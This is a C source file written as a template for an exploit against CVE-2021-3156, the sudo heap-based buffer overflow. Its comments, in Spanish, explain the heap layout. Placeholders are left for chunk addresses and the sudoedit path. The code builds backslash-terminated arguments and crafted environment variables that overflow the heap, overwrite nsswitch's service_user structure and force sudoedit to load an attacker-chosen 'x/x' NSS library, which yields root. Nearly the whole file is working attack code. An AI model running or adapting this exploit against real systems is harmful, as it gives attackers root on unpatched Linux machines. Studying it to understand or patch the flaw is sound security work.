/*
 * Copyright (C) 2021, Luis Molina Garzon, luis@iesvirgendelcarmen.com
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of version 2 of the GNU General Public License as
 * published by the Free Software Foundation.
 *
 * This program is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * General Public License for more details.
 *
 */
#include <string.h> 
#include <unistd.h> 

/* Exploit for CVE-2021-3156.
 * Qualys Research Team.
 * https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit
 *
 * Author: Luis Molina
 * 
 */

#define MAX_USERARG 0x3000
#define MAX_OVERFLOW 0x5000

int main()
{
    int chunk  = {{CHUNK}};
    int target = {{CHUNK_TARGET}};
    //quito los 8 bytes del header del chunk y 2 bytes (/ y null byte)
    int user_arg_tam = {{CHUNK_SIZE}}-8-2;

    /*Parametro terminado en \ causa el desbordamiento en el heap*/
    char user_arg[MAX_USERARG] = {0};
    memset(user_arg, 'A', user_arg_tam);
    strcat(user_arg, "\\");

    /*sudo copia las variables de entorno despues de los argumentos.
    overflow desborda justo antes de la estructura service_user de nsswitch
    del servicio files o systemd de group
    */
    int overflow_tam = target - chunk - user_arg_tam;
    char overflow[MAX_OVERFLOW] = {0};
    //sumo 8 bytes del header del chunk+3 (quito 2 \ y null byte)
    memset(overflow, 'C', overflow_tam-2);
    strcat(overflow, "\\");

    /*ptype service_table->entry.service
    * type = struct service_user {
    *   struct service_user *next; # 8 bytes
    *   lookup_actions actions[5]; # 24 bytes
    *   service_library *library; # 8 bytes
    *   void *known; # 8 bytes
    *   char name[0]; # string
    * } *
    * p sizeof(service_user) => 48 hasta name
    * 
    * Las variables de entorno se copian despues de argv si el ultimo argumento termina en \
    * '\\' inserta un null byte. Necesario para evitar crash en punteros de nsswitch
    */
    char* envp[] = {
        overflow,
        "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        "x/x\\", /* libnss_x/x.so.2*/
        "", /*Termina el desbordamiento*/
        {{ENVIRONMENT}}
        NULL};

    char *argv[] = {
        "sudoedit",
        "-s",
        user_arg,
        NULL
    };

    execve("{{SUDOEDIT_PATH}}", argv, envp);
}
